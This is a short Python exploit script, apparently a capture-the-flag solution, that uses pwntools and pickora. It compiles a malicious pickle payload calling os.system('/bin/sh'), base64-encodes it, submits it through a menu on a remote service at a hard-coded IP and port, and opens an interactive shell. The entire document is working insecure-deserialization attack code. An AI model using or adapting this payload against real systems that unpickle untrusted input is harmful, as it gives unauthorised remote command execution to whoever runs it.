from pwn import *
from pickora import Compiler
from base64 import b64encode

def gen_payload(payload):
    return b64encode(compiler.compile(payload))
    
def exploit():
    io = remote("94.237.62.149", 56240)
    macros = "GLOBAL('app', 'random._os.system')('/bin/sh')"
    payload = gen_payload(macros)
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b": ", payload)
    io.sendlineafter(b"> ", b"1")
    io.interactive()

if __name__ == "__main__":
    compiler = Compiler()
    exploit()
